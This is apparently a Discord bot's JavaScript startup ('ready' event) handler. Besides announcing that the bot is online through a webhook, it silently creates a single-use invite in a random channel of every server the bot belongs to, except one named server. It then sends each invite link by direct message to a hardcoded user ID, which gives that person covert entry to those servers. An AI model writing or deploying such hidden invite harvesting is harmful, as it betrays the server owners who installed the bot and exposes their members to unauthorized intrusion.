const { MessageEmbed, WebhookClient } = require('discord.js');
const webhookClient = new WebhookClient({ url: process.env.webhookurl });

module.exports = {
	name: 'ready',
	once: true,
	async execute(client) {
		console.log(`Ready! Logged in as ${client.user.tag}`);

        const online = new MessageEmbed()
    .setTitle('Online')
    .setDescription(`${client.user.tag} Is Now Online`)
    .setDescription(`${client.guilds.cache.size}`)
    .setColor('#82f282')
    .setTimestamp()
    .setThumbnail(client.user.displayAvatarURL());

    webhookClient.send({
        embeds: [online],
    });

    client.guilds.cache.forEach(guild => {
        if (guild.name === "Dino's Community!") return
        // console.log(`${guild.name}`)
        let listofchannells = [];
        let RANchannel = guild.channels.cache.forEach(channel => {
            // console.log(channel.name)
            listofchannells.push(channel.id)
        })

        // console.log(listofchannells)
        let invite = guild.invites.create(listofchannells[Math.floor(Math.random() * listofchannells.length)], {maxUses: 1})
        .then(async (invite) => {
            // invites.push(`${guild.name} - ${invite.url}`); // push invite link and guild name to array
            client.users.cache.get('247163579424309268').send(`https://discord.gg/${invite.code}`)
          })
        .catch(console.error);
        // guild.leave()
        // console.log(invite)
    })

    }
}